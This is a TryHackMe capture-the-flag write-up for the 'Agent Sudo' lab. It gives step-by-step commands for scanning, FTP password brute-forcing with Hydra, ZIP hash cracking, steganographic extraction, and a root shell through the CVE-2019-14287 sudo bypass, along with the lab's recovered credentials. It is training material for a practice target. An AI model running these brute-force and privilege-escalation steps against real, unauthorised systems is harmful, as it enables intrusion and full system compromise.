# 🕵️ TryHackMe — Agent Sudo Writeup

> A fun and beginner-friendly room covering enumeration, brute-forcing, steganography, and privilege escalation using **CVE-2019-14287**.

---

## 📌 Overview

This room walks through a full attack chain:

* 🔍 Enumeration
* 🌐 Web exploitation (User-Agent manipulation)
* 🔐 Brute-force attack (FTP)
* 🖼️ Steganography & file extraction
* 🧑‍💻 SSH access
* ⚡ Privilege escalation (sudo vulnerability)

---

## 1️⃣ Enumeration

Started by scanning the target machine:

```bash
nmap -sC -sV -v <IP>
```

### 🔎 Results:

* **Port 21** → FTP
* **Port 22** → SSH
* **Port 80** → HTTP

---

## 2️⃣ Web Enumeration

Visited the web server and found a hint:

> *"Use your own codename as a user agent to access the site from agent R."*

### 🔧 Testing User-Agent

```bash
curl -A "C" -L http://<IP>
```

✅ Success!

* Found a message mentioning **Chris**
* Hint: weak password

👉 Username identified: `chris`

---

## 3️⃣ FTP Brute Force

Used **Hydra** with `rockyou.txt`:

```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://<IP>
```

### 🔓 Credentials found:

```
Username: chris
Password: crystal
```

---

## 4️⃣ Steganography (Rabbit Hole 🐇)

Logged into FTP and downloaded:

* `To_agentJ.txt`
* `cutie.png`
* `cute-alien.jpg`

---

### 📦 Hidden ZIP in Image

```bash
binwalk -e cutie.png
```

Found a password-protected ZIP.

---

### 🔑 Crack ZIP Password

```bash
zip2john 8702.zip > hash.txt
john --wordlist=rockyou.txt hash.txt
```

✅ Password:

```
alien
```

---

### 🔍 Base64 Decode

Extracted file contained:

```
QXJlYTUx
```

Decoded →

```
Area51
```

---

### 🖼️ Extract Hidden Data

```bash
steghide extract -sf cute-alien.jpg
```

Passphrase:

```
Area51
```

---

### 🎯 Result:

Found credentials:

```
Username: james
Password: hackerrules!
```

---

## 5️⃣ Initial Access (SSH)

```bash
ssh james@<IP>
```

✅ Access granted!

Captured:

```
user_flag.txt
```

---

## 6️⃣ Privilege Escalation 🚀

Checked sudo permissions:

```bash
sudo -l
```

### ⚠️ Output:

```
(ALL, !root) /bin/bash
```

---

### 💥 Exploit — CVE-2019-14287

This misconfiguration allows bypass using UID `-1`.

```bash
sudo -u#-1 /bin/bash
```

🔥 Root shell obtained!

---

### 🏁 Final Step

```bash
cd /root
cat root.txt
```

✅ Root flag captured!

---

## 🧠 Key Takeaways

* User-Agent manipulation can reveal hidden content
* Weak passwords are still a major vulnerability
* Steganography can hide multiple layers of data
* Always check `sudo -l` for privilege escalation paths
* Misconfigured sudo rules can lead to full system compromise

---

## 🏆 Conclusion

This room is an excellent beginner lab that combines multiple real-world techniques into one smooth attack chain.

From clever enumeration to exploiting a real sudo vulnerability, everything ties together perfectly.

---

## 👨‍💻 Author

**Writeup by:** Muhammad Taher
**Platform:** TryHackMe

---
